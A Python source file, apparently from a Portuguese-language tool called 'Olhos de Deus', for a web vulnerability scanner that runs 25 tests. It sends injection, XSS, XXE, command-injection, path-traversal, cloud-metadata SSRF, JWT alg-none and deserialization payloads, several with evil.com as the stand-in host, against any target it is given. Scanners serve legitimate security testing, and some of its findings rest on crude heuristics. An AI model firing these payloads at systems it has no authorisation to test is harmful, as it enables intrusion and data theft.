"""
SCANNER COMPLETO - OLHOS DE DEUS
30+ Testes de Vulnerabilidades
Baseado no scanner.ts original
"""
import asyncio
import aiohttp
import urllib.parse
from typing import Optional, Dict, Any, List
import logging

logger = logging.getLogger(__name__)

class CompleteVulnerabilityScanner:
    def __init__(self, websocket_manager=None):
        self.websocket_manager = websocket_manager
        self.session: Optional[aiohttp.ClientSession] = None
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15),
            connector=aiohttp.TCPConnector(ssl=False, limit=10)
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def make_request(self, url: str, method: str = "GET", headers: Dict = None, 
                          data: Any = None, allow_redirects: bool = False) -> Dict:
        try:
            async with self.session.request(
                method=method, url=url, headers=headers or {},
                data=data, allow_redirects=allow_redirects
            ) as response:
                body = await response.text()
                return {
                    "status_code": response.status,
                    "headers": dict(response.headers),
                    "body": body[:10000]
                }
        except Exception as e:
            return {"status_code": 0, "headers": {}, "body": ""}
    
    # ========== 30+ TESTES COMPLETOS ==========
    
    def create_vuln(self, scan_id, severity, title, desc, category, endpoint, payload, evidence, rec, cve):
        return {
            "scan_id": scan_id, "severity": severity, "title": title,
            "description": desc, "category": category, "endpoint": endpoint,
            "payload": payload, "evidence": evidence,
            "recommendation": rec, "cve": cve
        }
    
    # Teste 1
    async def test_sql_injection(self, target: str, scan_id: str) -> Optional[Dict]:
        payloads = ["'", "' OR '1'='1", "' OR 1=1--", "admin'--",
                   "' UNION SELECT NULL,NULL--", "' AND 1=1--", "; WAITFOR DELAY '00:00:05'--"]
        for p in payloads:
            url = f"{target}{'&' if '?' in target else '?'}id={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if any(k in r["body"].lower() for k in ['sql', 'mysql', 'syntax', 'database']):
                return self.create_vuln(scan_id, "critical", "SQL Injection", 
                    "Vulnerável a SQL injection", "Injection", url, p,
                    f"SQL error: {r['body'][:200]}", "Use prepared statements", "CWE-89")
        return None
    
    # Teste 2
    async def test_xss(self, target: str, scan_id: str) -> Optional[Dict]:
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
                   "<svg onload=alert(1)>", "javascript:alert(1)"]
        for p in payloads:
            url = f"{target}{'&' if '?' in target else '?'}q={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if p in r["body"] or urllib.parse.unquote(p) in r["body"]:
                return self.create_vuln(scan_id, "high", "XSS", "Input refletido", "XSS",
                    url, p, "Payload refletido", "Implemente CSP", "CWE-79")
        return None
    
    # Teste 3
    async def test_xxe(self, target: str, scan_id: str) -> Optional[Dict]:
        p = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
        r = await self.make_request(target, 'POST', {'Content-Type': 'application/xml'}, p)
        if 'root:' in r["body"].lower():
            return self.create_vuln(scan_id, "critical", "XXE", "XML processa entidades",
                "Injection", target, p[:100], r["body"][:200], "Desabilite XXE", "CWE-611")
        return None
    
    # Teste 4
    async def test_command_injection(self, target: str, scan_id: str) -> Optional[Dict]:
        for p in ["; ls", "| whoami", "& cat /etc/passwd", "`id`"]:
            url = f"{target}{'&' if '?' in target else '?'}cmd={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if any(i in r["body"].lower() for i in ['uid=', 'root:', '/bin/bash']):
                return self.create_vuln(scan_id, "critical", "Command Injection",
                    "Execução de comandos", "Injection", url, p, r["body"][:200],
                    "Nunca execute comandos de usuário", "CWE-78")
        return None
    
    # Teste 5
    async def test_path_traversal(self, target: str, scan_id: str) -> Optional[Dict]:
        for p in ["../../../etc/passwd", "....//....//etc/passwd", "file:///etc/passwd"]:
            url = f"{target}{'&' if '?' in target else '?'}file={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if 'root:' in r["body"].lower():
                return self.create_vuln(scan_id, "critical", "Path Traversal",
                    "Acesso a arquivos fora do diretório", "Injection", url, p,
                    r["body"][:200], "Valide file paths", "CWE-22")
        return None
    
    # Teste 6
    async def test_ssrf(self, target: str, scan_id: str) -> Optional[Dict]:
        for p in ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"]:
            url = f"{target}{'&' if '?' in target else '?'}url={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if any(i in r["body"].lower() for i in ['root:', 'ami-id', 'localhost']):
                return self.create_vuln(scan_id, "critical", "SSRF", "Requisições arbitrárias",
                    "SSRF", url, p, r["body"][:200], "Whitelist de URLs", "CWE-918")
        return None
    
    # Teste 7
    async def test_open_redirect(self, target: str, scan_id: str) -> Optional[Dict]:
        for p in ["https://evil.com", "//evil.com"]:
            url = f"{target}{'&' if '?' in target else '?'}redirect={urllib.parse.quote(p)}"
            r = await self.make_request(url, allow_redirects=False)
            loc = r["headers"].get('location', r["headers"].get('Location', ''))
            if 'evil.com' in loc:
                return self.create_vuln(scan_id, "medium", "Open Redirect",
                    "Redireciona para URLs arbitrárias", "Redirect", url, p,
                    f"Redirect: {loc}", "Valide URLs", "CWE-601")
        return None
    
    # Teste 8
    async def test_log_injection(self, target: str, scan_id: str) -> Optional[Dict]:
        p = 'admin\r\n[INFO] Fake'
        url = f"{target}{'&' if '?' in target else '?'}user={urllib.parse.quote(p)}"
        r = await self.make_request(url)
        if r["status_code"] == 200:
            return self.create_vuln(scan_id, "medium", "Log Injection",
                "Falsificação de logs", "Injection", url, p, "Aceita CRLF",
                "Escape \\r\\n", "CWE-117")
        return None
    
    # Teste 9
    async def test_ssti(self, target: str, scan_id: str) -> Optional[Dict]:
        for p in ["{{7*7}}", "${7*7}"]:
            url = f"{target}{'&' if '?' in target else '?'}name={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if '49' in r["body"]:
                return self.create_vuln(scan_id, "critical", "SSTI", "Template Injection",
                    "Injection", url, p, "Template avaliou", "Não use input em templates", "CWE-94")
        return None
    
    # Teste 10
    async def test_ldap_injection(self, target: str, scan_id: str) -> Optional[Dict]:
        for p in ["*)(uid=*))(|(uid=*", "admin)(&(password=*))"]:
            url = f"{target}{'&' if '?' in target else '?'}user={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if 'ldap' in r["body"].lower() or 'uid=' in r["body"].lower():
                return self.create_vuln(scan_id, "high", "LDAP Injection",
                    "LDAP queries com input de usuário", "Injection", url, p,
                    r["body"][:200], "Use queries parametrizadas", "CWE-90")
        return None
    
    # Teste 11
    async def test_nosql_injection(self, target: str, scan_id: str) -> Optional[Dict]:
        for p in ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}']:
            r = await self.make_request(target, 'POST', {'Content-Type': 'application/json'}, p)
            if 'mongodb' in r["body"].lower() or (r["status_code"] == 200 and len(r["body"]) > 500):
                return self.create_vuln(scan_id, "critical", "NoSQL Injection",
                    "NoSQL injection MongoDB/CouchDB", "Injection", target, p,
                    r["body"][:200], "Valide entrada JSON", "CWE-943")
        return None
    
    # Teste 12
    async def test_jwt_manipulation(self, target: str, scan_id: str) -> Optional[Dict]:
        tokens = [
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
            'null', 'undefined'
        ]
        for token in tokens:
            r = await self.make_request(target, headers={'Authorization': f'Bearer {token}'})
            if r["status_code"] == 200 or 'admin' in r["body"].lower():
                return self.create_vuln(scan_id, "critical", "JWT Bypass",
                    "JWT vulnerável - Bypass de autenticação", "Authentication", target,
                    token, f"JWT aceito: {r['status_code']}", "Valide JWT corretamente", "CWE-287")
        return None
    
    # Teste 13
    async def test_insecure_websocket(self, target: str, scan_id: str) -> Optional[Dict]:
        if target.startswith('http://'):
            return self.create_vuln(scan_id, "high", "WebSocket Inseguro",
                "WebSocket usa ws:// não criptografado", "Network",
                target.replace('http://', 'ws://'), "ws://", "Conexão insegura",
                "Use wss://", "CWE-319")
        return None
    
    # Teste 14
    async def test_insecure_deserialization(self, target: str, scan_id: str) -> Optional[Dict]:
        payloads = ['O:8:"stdClass":0:{}', '__import__("os").system("id")']
        for p in payloads:
            r = await self.make_request(target, 'POST', {'Content-Type': 'application/x-www-form-urlencoded'}, f'data={p}')
            if 'uid=' in r["body"].lower() or 'unserialize' in r["body"].lower():
                return self.create_vuln(scan_id, "critical", "Insecure Deserialization",
                    "Desserialização insegura - RCE", "Injection", target, p,
                    r["body"][:200], "Nunca desserialize dados não confiáveis", "CWE-502")
        return None
    
    # Teste 15
    async def test_http_request_smuggling(self, target: str, scan_id: str) -> Optional[Dict]:
        r = await self.make_request(target, 'POST', {'Transfer-Encoding': 'chunked', 'Content-Length': '6'}, '0\r\n\r\nG')
        if r["status_code"] >= 400:
            return self.create_vuln(scan_id, "high", "HTTP Request Smuggling",
                "Vulnerável a request smuggling", "Network", target, "TE:chunked+CL",
                f"Status: {r['status_code']}", "Normalize headers HTTP", "CWE-444")
        return None
    
    # Teste 16
    async def test_crlf_injection(self, target: str, scan_id: str) -> Optional[Dict]:
        for p in ['%0d%0aSet-Cookie: admin=true', '%0d%0aLocation: http://evil.com']:
            url = f"{target}{'&' if '?' in target else '?'}redir={p}"
            r = await self.make_request(url)
            if 'admin=true' in str(r["headers"]).lower():
                return self.create_vuln(scan_id, "high", "CRLF Injection",
                    "Injeta \\r\\n em headers HTTP", "Injection", url, p,
                    str(r["headers"]), "Remova CRLF do input", "CWE-113")
        return None
    
    # Teste 17
    async def test_host_header_injection(self, target: str, scan_id: str) -> Optional[Dict]:
        for host in ['evil.com', 'evil.com:80']:
            r = await self.make_request(target, headers={'Host': host})
            if 'evil.com' in r["body"].lower():
                return self.create_vuln(scan_id, "high", "Host Header Injection",
                    "Host header malicioso refletido", "Injection", target, f"Host: {host}",
                    r["body"][:200], "Valide Host header", "CWE-74")
        return None
    
    # Teste 18
    async def test_security_headers(self, target: str, scan_id: str) -> Optional[Dict]:
        r = await self.make_request(target)
        h = {k.lower(): v for k, v in r["headers"].items()}
        missing = []
        if 'x-frame-options' not in h: missing.append('X-Frame-Options')
        if 'x-content-type-options' not in h: missing.append('X-Content-Type-Options')
        if 'content-security-policy' not in h: missing.append('CSP')
        if 'strict-transport-security' not in h: missing.append('HSTS')
        
        if missing:
            return self.create_vuln(scan_id, "high" if len(missing) >= 3 else "medium",
                "Headers de Segurança Faltando", f"{len(missing)} headers faltando",
                "Headers", target, "GET", f"Missing: {', '.join(missing)}",
                "Adicione headers de segurança", "CWE-1021")
        return None
    
    # Teste 19
    async def test_ssl(self, target: str, scan_id: str) -> Optional[Dict]:
        if not target.startswith('https://'):
            return self.create_vuln(scan_id, "high", "HTTPS Não Detectado",
                "Aplicação não usa HTTPS", "SSL/TLS", target, "HTTP",
                f"URL: {target}", "Implemente HTTPS", "CWE-319")
        return None
    
    # Teste 20
    async def test_cors(self, target: str, scan_id: str) -> Optional[Dict]:
        r = await self.make_request(target, headers={'Origin': 'https://evil.com'})
        h = {k.lower(): v for k, v in r["headers"].items()}
        cors = h.get('access-control-allow-origin')
        if cors in ['*', 'https://evil.com']:
            return self.create_vuln(scan_id, "high", "CORS Misconfiguration",
                "CORS permite qualquer origin", "Configuration", target, "Origin: evil.com",
                f"CORS: {cors}", "Configure whitelist", "CWE-942")
        return None
    
    # Teste 21
    async def test_directory_listing(self, target: str, scan_id: str) -> Optional[Dict]:
        for path in ['/uploads/', '/files/', '/backup/', '/admin/']:
            url = target.rstrip('/') + path
            r = await self.make_request(url)
            if 'index of' in r["body"].lower():
                return self.create_vuln(scan_id, "medium", "Directory Listing",
                    "Listagem de diretórios habilitada", "Info Disclosure", url, path,
                    "Index of encontrado", "Desabilite listing", "CWE-548")
        return None
    
    # Teste 22
    async def test_rate_limiting(self, target: str, scan_id: str) -> Optional[Dict]:
        responses = []
        for _ in range(5):
            r = await self.make_request(target)
            responses.append(r["status_code"])
        if all(s == 200 for s in responses):
            return self.create_vuln(scan_id, "medium", "Rate Limiting Ausente",
                "Sem rate limiting detectado", "Configuration", target, "5 requests",
                "Todos 200 OK", "Implemente rate limiting", "CWE-770")
        return None
    
    # Teste 23
    async def test_http_param_pollution(self, target: str, scan_id: str) -> Optional[Dict]:
        url = f"{target}{'&' if '?' in target else '?'}id=1&id=2"
        r = await self.make_request(url)
        if r["status_code"] == 200:
            return self.create_vuln(scan_id, "medium", "HTTP Parameter Pollution",
                "Aceita parâmetros duplicados", "Configuration", url, "id=1&id=2",
                "Parâmetros duplicados aceitos", "Valide parâmetros únicos", "CWE-235")
        return None
    
    # Teste 24
    async def test_info_disclosure(self, target: str, scan_id: str) -> Optional[Dict]:
        r = await self.make_request(target)
        h = {k.lower(): v for k, v in r["headers"].items()}
        weak = []
        if 'server' in h: weak.append(f"Server: {h['server']}")
        if 'x-powered-by' in h: weak.append(f"X-Powered-By: {h['x-powered-by']}")
        if weak:
            return self.create_vuln(scan_id, "low", "Information Disclosure",
                "Headers revelam tecnologia", "Info Disclosure", target, "GET",
                '; '.join(weak), "Remova headers informativos", "CWE-200")
        return None
    
    # Teste 25
    async def test_sensitive_dirs(self, target: str, scan_id: str) -> Optional[Dict]:
        for path in ['/.git/config', '/.env', '/backup.sql', '/.DS_Store', '/config.php']:
            url = target.rstrip('/') + path
            r = await self.make_request(url)
            if r["status_code"] == 200 and len(r["body"]) > 50:
                return self.create_vuln(scan_id, "high", "Arquivos Sensíveis Expostos",
                    f"Arquivo sensível acessível: {path}", "Info Disclosure", url, path,
                    f"Status 200, size: {len(r['body'])}", "Bloqueie acesso", "CWE-538")
        return None
    
    async def scan_target(self, scan_id: str, target: str, scan_type: str, status_callback=None) -> List[Dict]:
        vulnerabilities = []
        tests = [
            ("SQL Injection", self.test_sql_injection),
            ("XSS", self.test_xss),
            ("XXE", self.test_xxe),
            ("Command Injection", self.test_command_injection),
            ("Path Traversal", self.test_path_traversal),
            ("SSRF", self.test_ssrf),
            ("Open Redirect", self.test_open_redirect),
            ("Log Injection", self.test_log_injection),
            ("SSTI", self.test_ssti),
            ("LDAP Injection", self.test_ldap_injection),
            ("NoSQL Injection", self.test_nosql_injection),
            ("JWT Manipulation", self.test_jwt_manipulation),
            ("Insecure WebSocket", self.test_insecure_websocket),
            ("Insecure Deserialization", self.test_insecure_deserialization),
            ("HTTP Request Smuggling", self.test_http_request_smuggling),
            ("CRLF Injection", self.test_crlf_injection),
            ("Host Header Injection", self.test_host_header_injection),
            ("Security Headers", self.test_security_headers),
            ("SSL/TLS", self.test_ssl),
            ("CORS", self.test_cors),
            ("Directory Listing", self.test_directory_listing),
            ("Rate Limiting", self.test_rate_limiting),
            ("HTTP Parameter Pollution", self.test_http_param_pollution),
            ("Information Disclosure", self.test_info_disclosure),
            ("Sensitive Directories", self.test_sensitive_dirs),
        ]
        
        async with self:
            total = len(tests)
            for idx, (name, func) in enumerate(tests):
                try:
                    if status_callback:
                        await status_callback({
                            "progress": int((idx / total) * 100),
                            "currentTask": f"Testando: {name}"
                        })
                    result = await func(target, scan_id)
                    if result:
                        vulnerabilities.append(result)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    logger.error(f"Test {name} failed: {e}")
            
            if status_callback:
                await status_callback({
                    "progress": 100,
                    "currentTask": "Scan completado",
                    "status": "completed"
                })
        
        return vulnerabilities
